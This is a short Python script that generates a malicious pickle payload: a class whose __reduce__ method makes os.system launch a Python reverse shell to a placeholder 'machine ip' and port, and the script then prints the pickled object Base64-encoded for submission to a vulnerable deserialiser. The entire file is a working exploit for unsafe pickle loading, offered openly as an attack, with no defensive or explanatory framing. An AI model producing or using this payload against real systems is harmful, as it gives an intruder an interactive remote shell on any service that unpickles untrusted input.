import pickle
import base64
import os

class Malicious:
    def __reduce__(self):
        #python code that generates reverse shell
        cmd = (
            "python3 -c \"import socket,subprocess,os;"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            "s.connect(('machine ip', port));"
            "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            "subprocess.call(['/bin/sh','-i'])\""
        )
        return (os.system, (cmd,))

payload = pickle.dumps(Malicious())
encoded = base64.b64encode(payload).decode()
print("\n[+] payload Base64 :")
print(encoded)

